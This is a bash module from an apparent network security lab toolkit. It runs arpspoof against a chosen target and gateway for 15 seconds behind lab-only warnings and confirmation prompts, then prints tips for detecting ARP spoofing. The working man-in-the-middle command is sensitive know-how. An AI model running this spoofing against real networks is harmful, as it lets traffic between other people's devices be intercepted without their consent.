#!/bin/bash
# ==========================================================
# modules/network/04_mitm_lab.sh
# DISRUPTIVE / LAB ONLY
#
# Objective: Demonstrate MITM positioning technique (ARP spoofing) for
# defensive awareness in an isolated lab. Runs for a fixed short window
# and clearly explains how to detect/prevent it, rather than acting as
# an open-ended interception tool.
# Tools: arpspoof (dsniff package) or ettercap (informational path)
# ==========================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../common.sh"

run_mitm_lab() {
    local TARGET="$1"

    warn "=============================================="
    warn " DISRUPTIVE / LAB-ONLY MODULE"
    warn " ARP spoofing affects traffic flow on the LOCAL"
    warn " SEGMENT ONLY. Only run inside an isolated lab"
    warn " network (e.g. your vmnet1 host-only network)."
    warn " Never run this on a shared/production network."
    warn "=============================================="

    read -rp "Confirm this is running on your isolated lab segment (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        error "Not confirmed. Aborting."
        return 1
    fi

    check_deps ip

    read -rp "Enter the gateway IP for this lab segment: " gateway
    if ! validate_target "$gateway" >/dev/null; then
        error "Invalid gateway IP."
        return 1
    fi

    if ! command -v arpspoof >/dev/null 2>&1; then
        warn "arpspoof not installed (part of dsniff package)."
        echo "Install with: sudo apt install dsniff"
        return 1
    fi

    local LOGFILE
    LOGFILE=$(log_path "net_mitm_lab")
    info "Logging to $LOGFILE"
    info "Enabling IP forwarding so target traffic still reaches the gateway..."
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

    local DURATION=15
    info "Running arpspoof for a fixed ${DURATION}s window (target <-> gateway)..."

    {
        echo "===== SentryNet MITM Lab Demo: $TARGET <-> $gateway ====="
        date
        echo "Duration: ${DURATION}s (fixed, non-persistent)"
    } | tee "$LOGFILE"

    run_with_timeout "$DURATION" sudo arpspoof -i eth0 -t "$TARGET" "$gateway" | tee -a "$LOGFILE" &
    local pid=$!
    wait $pid

    info "Restoring IP forwarding to disabled state..."
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

    {
        echo -e "\n===== MITM lab demo complete ====="
        echo "Detection tip: monitor for duplicate/changing MAC-to-IP mappings"
        echo "(arpwatch, arp -a diffing) and enable Dynamic ARP Inspection on"
        echo "managed switches in real environments."
    } | tee -a "$LOGFILE"

    ok "MITM lab demo finished. Results: $LOGFILE"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    TARGET=$(prompt_target)
    confirm_authorization "$TARGET" || exit 1
    run_mitm_lab "$TARGET"
fi
